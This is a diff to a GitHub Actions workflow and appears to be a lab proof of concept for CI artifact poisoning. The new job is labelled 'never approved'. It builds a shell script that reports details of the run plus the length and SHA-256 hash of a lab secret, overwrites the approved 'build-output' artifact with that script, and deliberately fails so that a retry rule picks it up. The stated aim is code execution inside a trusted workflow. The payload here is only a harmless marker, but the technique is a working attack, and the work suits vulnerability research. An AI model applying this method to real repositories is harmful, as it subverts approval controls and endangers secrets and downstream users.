@@ -5,18 +5,32 @@ jobs:
   plain:
     runs-on: ubuntu-latest
     steps:
-      - name: record
+      - name: definition marker
         run: |
-          echo "AR-PLAIN-ATTEMPT=${{ github.run_attempt }}"
-          echo "PLAIN_PINNED_GITHUB_SHA=$GITHUB_SHA"
-          echo "PLAIN_EVENT_HEAD_SHA=${{ github.event.pull_request.head.sha }}"
-          echo "PLAIN_SECRET_SOURCE_CHECK=done"
-      - name: resolve at job time
+          echo "DEFN_VERSION=2-NEVER-APPROVED"
+          echo "DEFN_ATTEMPT=${{ github.run_attempt }}"
+          echo "DEFN_PINNED_GITHUB_SHA=$GITHUB_SHA"
+          echo "DEFN_EVENT_HEAD_SHA=${{ github.event.pull_request.head.sha }}"
+      - name: step that exists only in definition 2
+        run: echo "DEFN_NEW_STEP_RAN=yes"
+      - name: build the payload from the definition itself, no checkout
         run: |
-          mkdir w && cd w && git init -q
-          git remote add origin "https://github.com/${{ github.repository }}.git"
-          git fetch -q --depth=1 origin "refs/pull/${{ github.event.pull_request.number }}/head"
-          git checkout -q FETCH_HEAD
-          echo "PLAIN_FETCHED_SHA=$(git rev-parse HEAD)"
-          echo "PLAIN_SCRIPT_MARKER=$(head -2 ci/run.sh | tail -1)"
-      - run: exit 1
+          mkdir -p out
+          printf '%s\n' \
+            'echo "H48F-ARTIFACT-DEFN2-NEVER-APPROVED"' \
+            'echo "H48F_RCE_IN_TRUSTED_WORKFLOW=yes"' \
+            'echo "H48F_REPO=$GITHUB_REPOSITORY"' \
+            'echo "H48F_EVENT=$GITHUB_EVENT_NAME"' \
+            'echo "H48F_REF=$GITHUB_REF"' \
+            'echo "H48F_SECRET_LEN=${#LAB_SECRET}"' \
+            'echo "H48F_SECRET_SHA256=$(printf %s "$LAB_SECRET" | sha256sum | cut -d" " -f1)"' \
+            > out/report.sh
+          cat out/report.sh
+      - name: upload, overwriting the approved artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: build-output
+          path: out/
+          overwrite: true
+      - name: fail so the retry rule matches
+        run: exit 1
